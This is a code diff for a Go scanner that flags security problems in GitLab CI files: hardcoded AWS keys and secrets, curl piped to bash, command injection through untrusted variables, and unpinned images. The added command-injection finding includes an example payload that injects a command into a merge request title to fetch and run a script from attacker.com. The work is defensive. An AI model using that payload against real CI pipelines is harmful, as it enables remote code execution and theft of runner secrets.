@@ -48,14 +48,22 @@ func ScanGitlabData(data []byte) ([]Issue, error) {
 		issues = append(issues, Issue{
 			Rule:     "Hardcoded AWS Key",
 			Severity: "CRITICAL",
-			Message:  "Found a hardcoded AWS Access Key (AKIA...) in the GitLab workflow file.\n   Risk: Anyone who can read this repo can compromise your AWS environment.\n   Fix: Move this to GitLab CI/CD Variables.",
+			Location: "Global (File content)",
+			PoC:      extractMatch(awsKeyRegex, contentStr),
+			Exploit:  "Attackers clone/scrape the public repository and extract the plaintext AWS credential to authenticate to the AWS API.",
+			Impact:   "Anyone who can read this repo can compromise the associated AWS environment.",
+			Fix:      "Move this to GitLab CI/CD Variables.",
 		})
 	}
 	if passwordRegex.MatchString(contentStr) {
 		issues = append(issues, Issue{
 			Rule:     "Potential Hardcoded Secret",
 			Severity: "HIGH",
-			Message:  "Found a potential hardcoded password/token/secret in the GitLab workflow file.\n   Risk: Hardcoding secrets leads to accidental leaks and credential theft.\n   Fix: Move this to GitLab CI/CD Variables.",
+			Location: "Global (File content)",
+			PoC:      extractMatch(passwordRegex, contentStr),
+			Exploit:  "Attackers use automated tools to scan repos for keywords like 'password' or 'token' followed by high-entropy strings.",
+			Impact:   "Hardcoding secrets leads to accidental leaks and potential credential theft.",
+			Fix:      "Move this to GitLab CI/CD Variables.",
 		})
 	}
 
@@ -71,6 +79,7 @@ func ScanGitlabData(data []byte) ([]Issue, error) {
 		if !ok {
 			continue
 		}
+		jobScope := "Job: " + key
 
 		// Check for specific security issues in the job's scripts
 		checkScripts := func(scriptInterface interface{}, scriptType string) {
@@ -102,7 +111,11 @@ func ScanGitlabData(data []byte) ([]Issue, error) {
 					issues = append(issues, Issue{
 						Rule:     "Remote Code Execution (Curl to Bash)",
 						Severity: "HIGH",
-						Message:  "Job '" + key + "' downloads and executes a script directly via pipe in " + scriptType + ".\n   Risk: If the remote server is compromised or MITM'd, you will execute malware.\n   Fix: Download the script, verify its SHA256 checksum, then execute it.",
+						Location: jobScope + " > " + scriptType,
+						PoC:      extractMatch(curlBashRegex, scriptLine),
+						Exploit:  "If the remote server is compromised or MITM'd, the attacker modifies the script and it is immediately executed via the pipe.",
+						Impact:   "Blind execution of untrusted malware on the runner.",
+						Fix:      "Download the script, verify its SHA256 checksum, then execute it.",
 					})
 				}
 
@@ -120,7 +133,11 @@ func ScanGitlabData(data []byte) ([]Issue, error) {
 						issues = append(issues, Issue{
 							Rule:     "Command Injection Risk",
 							Severity: "CRITICAL",
-							Message:  "Job '" + key + "' evaluates untrusted variable '" + untrustedVar + "' directly in a shell script.\n   Risk: An attacker can submit a malicious commit message or MR title to execute arbitrary code.\n   Fix: Pass the variable safely to a script file rather than executing it inline.",
+							Location: jobScope + " > " + scriptType,
+							PoC:      scriptLine,
+							Exploit:  "An attacker submits a malicious merge request title or commit message like `\"; curl attacker.com/malware | sh #`. The variable is interpolated and executed by the shell.",
+							Impact:   "Remote Code Execution on the GitLab Runner.",
+							Fix:      "Pass the variable safely to a script file rather than executing it inline.",
 						})
 						break
 					}
@@ -140,7 +157,11 @@ func ScanGitlabData(data []byte) ([]Issue, error) {
 					issues = append(issues, Issue{
 						Rule:     "Unpinned Docker Image",
 						Severity: "MEDIUM",
-						Message:  "Job '" + key + "' uses an unpinned Docker image '" + image + "'.\n   Risk: The underlying image can change unexpectedly, introducing vulnerabilities or breaking builds.\n   Fix: Pin the image to a specific SHA256 hash.",
+						Location: jobScope,
+						PoC:      "image: " + image,
+						Exploit:  "The underlying image tag (e.g. 'latest') changes unexpectedly or is compromised in the upstream registry. The runner pulls the compromised image automatically.",
+						Impact:   "Supply chain attack leading to backdoored builds or stolen secrets.",
+						Fix:      "Pin the image to a specific SHA256 hash (e.g., node@sha256:1234...).",
 					})
 				}
 			}
